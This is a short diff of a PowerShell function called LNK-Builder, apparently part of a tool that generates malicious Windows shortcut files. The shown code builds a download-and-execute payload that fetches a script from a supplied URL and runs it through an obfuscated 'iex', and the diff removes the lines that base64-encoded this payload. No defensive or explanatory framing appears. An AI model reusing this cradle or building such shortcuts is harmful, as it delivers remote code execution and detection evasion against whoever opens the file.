@@ -32,8 +32,6 @@ function LNK-Builder
     )
     
     $payload = "(New-Object System.Net.WebClient).downloadstring('{0}') | i`e`x" -f $url
-    $Bytes = [System.Text.Encoding]::Unicode.GetBytes($payload)
-    $EncodedPayload =[Convert]::ToBase64String($Bytes)
     $DateTime = (Get-Date).ToUniversalTime()
     $UnixTimeStamp = [System.Math]::Truncate((Get-Date -Date $DateTime -UFormat %s))
     $md5 = new-object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider
